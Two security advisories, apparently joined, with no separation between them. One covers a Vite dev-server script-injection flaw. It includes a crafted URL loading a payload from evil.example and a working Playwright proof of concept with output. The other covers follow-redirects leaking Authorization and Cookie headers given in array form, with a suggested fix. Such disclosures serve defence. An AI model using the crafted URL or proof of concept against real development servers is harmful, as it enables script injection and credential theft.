### Summary

When accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.

### Impact

Only apps that match the following conditions are affected:

- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.
- the transformed HTML contains an inline module script
- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions

### Details

[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:

```js
const url = req.originalUrl
template = await vite.transformIndexHtml(url, template)
```

For a development server at `http://localhost:5173`, an attacker can send this URL:

```text
http://localhost:5173//evil.example/payload.js?/../../package.json
```

In Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.

Chromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.

[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:

```html
<script type="module" src="//evil.example/payload.js?/../../package.json?html-proxy&index=0.js"></script>
```

The generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.

### PoC

```js
import { createServer as createHttpServer } from 'node:http'
import { createRequire } from 'node:module'
import { dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const directory = dirname(fileURLToPath(import.meta.url))
const require = createRequire(join(directory, 'package.json'))
const { chromium } = require('playwright-chromium')
const viteModule = await import(
  pathToFileURL(require.resolve('vite')).href
)
const createViteServer =
  viteModule.createServer ?? viteModule.default.createServer

// This loopback server stands in for a separately hosted attacker website.
const attackerPort = 4173
const exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`
const html = '<script type="module">document.body.textContent = "Vite app"</script>'

const listen = (server, port = 0) =>
  new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(port, '127.0.0.1', () => {
      server.off('error', reject)
      resolve(server.address().port)
    })
  })

const close = (server) =>
  new Promise((resolve, reject) => {
    server.close((error) => (error ? reject(error) : resolve()))
  })

let attackerRequest = null
const attacker = createHttpServer((request, response) => {
  attackerRequest = request.url
  response.writeHead(200, {
    'access-control-allow-origin': '*',
    'content-type': 'text/javascript',
  })
  response.end(
    "document.documentElement.dataset.viteXssPoc = 'executed'",
  )
})

const vite = await createViteServer({
  appType: 'custom',
  configFile: false,
  root: directory,
  server: {
    hmr: false,
    middlewareMode: true,
    watch: null,
  },
})

const application = createHttpServer((request, response) => {
  vite.middlewares(request, response, async (error) => {
    if (error) {
      response.destroy(error)
      return
    }

    try {
      const transformed = await vite.transformIndexHtml(request.url, html)
      response.writeHead(200, { 'content-type': 'text/html' })
      response.end(transformed)
    } catch (transformError) {
      response.destroy(transformError)
    }
  })
})

await listen(attacker, attackerPort)
const applicationPort = await listen(application)
const browser = await chromium.launch({ headless: true })

try {
  const page = await browser.newPage()
  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)
  await page.waitForFunction(
    () => document.documentElement.dataset.viteXssPoc === 'executed',
  )

  console.log(`attacker request: ${attackerRequest}`)
  console.log('JavaScript from the attacker server executed in the Vite page')
} finally {
  await browser.close()
  await close(application)
  await vite.close()
  await close(attacker)
}
```

Observed output on Vite 8.2.1:
```text
attacker request: /payload.js?/../../package.json?html-proxy&index=0.js
JavaScript from the attacker server executed in the Vite page
```

### Summary
follow-redirects removes sensitive credential headers (Authorization, Proxy-Authorization, Cookie, and any caller-declared `sensitiveHeaders`) before following a redirect that crosses to a different host or downgrades to a less secure protocol. The removal routine iterates the caller's headers container with `for...in` and matches header names against a filter. This assumes the headers container is a plain object keyed by header names. Node's underlying `http.request`, which follow-redirects is a drop-in replacement for, also accepts headers as an alternating array of names and values. For an array, `for...in` yields the numeric indices `"0"`, `"1"`, `"2"` and so on, which never match a header-name filter, so nothing is removed. An application that sends array-form headers and follows an attacker-controlled cross-origin redirect therefore forwards its Authorization, Cookie, and Proxy-Authorization headers verbatim to the attacker-controlled destination, with no error or warning. The `sensitiveHeaders` option added to fix CVE-2026-40895 / GHSA-r4q5-vmmm-2653 is equally ineffective, because it relies on the same helper. This is an unauthenticated confidentiality vulnerability: any remote server the victim application contacts can harvest the victim's credential headers by responding with a cross-origin redirect.

### Details
The cross-origin credential-stripping control is implemented by `removeMatchingHeaders(regex, headers)` at `index.js:630-640`:

```js
function removeMatchingHeaders(regex, headers) {
  var lastValue;
  for (var header in headers) {          // for...in over an ARRAY yields "0","1","2"...
    if (regex.test(header)) {            // the header-name filter never matches a numeric index
      lastValue = headers[header];
      delete headers[header];
    }
  }
  return (lastValue === null || typeof lastValue === "undefined") ?
    undefined : String(lastValue).trim();
}
```

It is invoked from `_processResponse` for three purposes, all with the caller-supplied `this._options.headers`:

- `index.js:490` - strip the credential filter (`this._headerFilter`, which covers the built-in list Authorization/Proxy-Authorization/Cookie plus any `sensitiveHeaders`) when the redirect crosses origin or downgrades protocol.
- `index.js:470` - strip the `Host` header (`/^host$/i`).
- `index.js:466` - strip `content-*` headers when a 301/302/303 converts POST to GET.

The caller-supplied headers container is passed straight through to each redirected request via `nativeProtocol.request(this._options)` at `index.js:352`. `_sanitizeOptions` (index.js:300-331) only replaces `options.headers` when it is falsy, so an array is left untouched.

Node's `http.request` accepts `options.headers` as an alternating array of names and values (for example `["Authorization", "Bearer ...", "Cookie", "session=..."]`). This is a supported way to control header ordering and duplication. For such an array, `for (var header in headers)` iterates the numeric indices `"0"`, `"1"`, `"2"`, and the header-name regex never matches any of them, so `removeMatchingHeaders` deletes nothing. Every one of the three strip operations above silently no-ops:

- The built-in credential headers (Authorization, Cookie, Proxy-Authorization) are forwarded to the cross-origin redirect target.
- Any `sensitiveHeaders` the caller declared are forwarded too.
- The stale `Host` of the previous origin is re-sent to the new origin.
- On a POST-to-GET redirect the `content-*` headers are retained, leaving `Content-Length` inconsistent with the now-empty body.

The primary and highest-impact consequence is disclosure of credential headers. The stale `Host` re-send and the `Content-Length` inconsistency are secondary correctness defects arising from the same root cause.

Root-cause history: the `for...in`-based `removeMatchingHeaders` used for the built-in credential strip has been present since the cross-host Authorization drop was introduced (commit `724087d`, first released in v1.11.0) and is unchanged through 1.16.0. The `sensitiveHeaders` layer was introduced in 1.16.0 (commit `844c4d3`). The behavior was verified directly on both 1.15.11 and 1.16.0.

Suggested remediation: handle or explicitly reject Node's array-form headers. The strictest fix is to detect `Array.isArray(options.headers)` in `_sanitizeOptions` and throw a clear `TypeError` instructing callers to pass an object, so misuse fails loudly instead of silently downgrading security. If array support is desired, extend `removeMatchingHeaders` to walk the array in name/value pairs:

```js
function removeMatchingHeaders(regex, headers) {
  if (Array.isArray(headers)) {
    var lastValue;
    for (var i = 0; i < headers.length; i += 2) {
      if (regex.test(headers[i])) { lastValue = headers[i + 1]; headers.splice(i, 2); i -= 2; }
    }
    return (lastValue === null || typeof lastValue === "undefined") ? undefined : String(lastValue).trim();
  }
  // existing object logic
}
```

Apply the same guard to the `Host` and `content-*` removal paths. Add regression tests that exercise array-form headers across a cross-origin redirect; the current suite only covers object-form headers.

